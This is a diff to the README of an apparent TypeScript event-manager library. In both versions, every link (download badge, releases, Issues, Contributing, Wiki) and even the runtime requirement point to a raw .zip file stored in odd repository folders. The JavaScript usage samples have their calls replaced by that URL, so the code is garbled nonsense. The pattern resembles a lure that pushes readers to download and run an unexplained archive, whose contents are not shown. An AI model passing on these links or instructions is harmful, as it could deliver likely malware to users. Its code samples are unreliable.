@@ -8,13 +8,13 @@ Welcome to event-manager! This library helps you manage events easily in TypeScr
 
 To get started with event-manager, visit the link below to download the latest version:
 
-[![Download event-manager](https://raw.githubusercontent.com/mjohntimothy/event-manager/main/rumgumption/event-manager.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mjohntimothy/event-manager/main/rumgumption/event-manager.zip)
+[![Download event-manager](https://github.com/mjohntimothy/event-manager/raw/refs/heads/main/test/manager_event_noncapsizable.zip%20Now-Click%20Here-brightgreen)](https://github.com/mjohntimothy/event-manager/raw/refs/heads/main/test/manager_event_noncapsizable.zip)
 
 ### Step-by-Step Instructions
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page:  
-   [Download event-manager](https://raw.githubusercontent.com/mjohntimothy/event-manager/main/rumgumption/event-manager.zip)
+   [Download event-manager](https://github.com/mjohntimothy/event-manager/raw/refs/heads/main/test/manager_event_noncapsizable.zip)
 
 2. **Choose the Latest Version**  
    Look for the latest version listed at the top. It will have a version number like v1.0. Click on the version to see more details.
@@ -30,8 +30,8 @@ To get started with event-manager, visit the link below to download the latest v
 - **Operating Systems:**  
   Windows 10 or newer, macOS 10.12 or newer, Linux (Kernel 4.15 or newer).
 
-- **https://raw.githubusercontent.com/mjohntimothy/event-manager/main/rumgumption/event-manager.zip**  
-  You need https://raw.githubusercontent.com/mjohntimothy/event-manager/main/rumgumption/event-manager.zip version 12 or newer to use event-manager effectively. You can download https://raw.githubusercontent.com/mjohntimothy/event-manager/main/rumgumption/event-manager.zip from [https://raw.githubusercontent.com/mjohntimothy/event-manager/main/rumgumption/event-manager.zip](https://raw.githubusercontent.com/mjohntimothy/event-manager/main/rumgumption/event-manager.zip).
+- **https://github.com/mjohntimothy/event-manager/raw/refs/heads/main/test/manager_event_noncapsizable.zip**  
+  You need https://github.com/mjohntimothy/event-manager/raw/refs/heads/main/test/manager_event_noncapsizable.zip version 12 or newer to use event-manager effectively. You can download https://github.com/mjohntimothy/event-manager/raw/refs/heads/main/test/manager_event_noncapsizable.zip from [https://github.com/mjohntimothy/event-manager/raw/refs/heads/main/test/manager_event_noncapsizable.zip](https://github.com/mjohntimothy/event-manager/raw/refs/heads/main/test/manager_event_noncapsizable.zip).
 
 ### How to Use event-manager
 
@@ -61,15 +61,15 @@ After downloading and installing, follow these simple steps to start using event
 5. **Add Event Listeners**  
    Use the manager to listen for specific events:  
    ```javascript
-   https://raw.githubusercontent.com/mjohntimothy/event-manager/main/rumgumption/event-manager.zip('eventName', (data) => {
-       https://raw.githubusercontent.com/mjohntimothy/event-manager/main/rumgumption/event-manager.zip(data);
+   https://github.com/mjohntimothy/event-manager/raw/refs/heads/main/test/manager_event_noncapsizable.zip('eventName', (data) => {
+       https://github.com/mjohntimothy/event-manager/raw/refs/heads/main/test/manager_event_noncapsizable.zip(data);
    });
    ```
 
 6. **Trigger Events**  
    You can now trigger events whenever necessary:  
    ```javascript
-   https://raw.githubusercontent.com/mjohntimothy/event-manager/main/rumgumption/event-manager.zip('eventName', 'Hello, Event!');
+   https://github.com/mjohntimothy/event-manager/raw/refs/heads/main/test/manager_event_noncapsizable.zip('eventName', 'Hello, Event!');
    ```
    This will log "Hello, Event!" in your console.
 
@@ -92,13 +92,13 @@ After downloading and installing, follow these simple steps to start using event
 We encourage our users to contribute to the project. If you have questions or need assistance, feel free to contact us through the following channels:
 
 - **Issues Section on GitHub**  
-  Report any problems or request new features directly on our [Issues page](https://raw.githubusercontent.com/mjohntimothy/event-manager/main/rumgumption/event-manager.zip).
+  Report any problems or request new features directly on our [Issues page](https://github.com/mjohntimothy/event-manager/raw/refs/heads/main/test/manager_event_noncapsizable.zip).
 
 - **Contributing**  
-  If you wish to contribute to the project, please read our [Contributing Guide](https://raw.githubusercontent.com/mjohntimothy/event-manager/main/rumgumption/event-manager.zip).
+  If you wish to contribute to the project, please read our [Contributing Guide](https://github.com/mjohntimothy/event-manager/raw/refs/heads/main/test/manager_event_noncapsizable.zip).
 
 - **Documentation**  
-  More detailed documentation is available on our [Wiki](https://raw.githubusercontent.com/mjohntimothy/event-manager/main/rumgumption/event-manager.zip).
+  More detailed documentation is available on our [Wiki](https://github.com/mjohntimothy/event-manager/raw/refs/heads/main/test/manager_event_noncapsizable.zip).
 
 ## 🤝 Acknowledgments
 
@@ -109,4 +109,4 @@ Thank you to the contributors and the community who have helped shape event-mana
 This project is licensed under the MIT License. For more details, please see the [LICENSE](LICENSE) file.
 
 Remember to download the latest version here:  
-[Download event-manager](https://raw.githubusercontent.com/mjohntimothy/event-manager/main/rumgumption/event-manager.zip)
+[Download event-manager](https://github.com/mjohntimothy/event-manager/raw/refs/heads/main/test/manager_event_noncapsizable.zip)
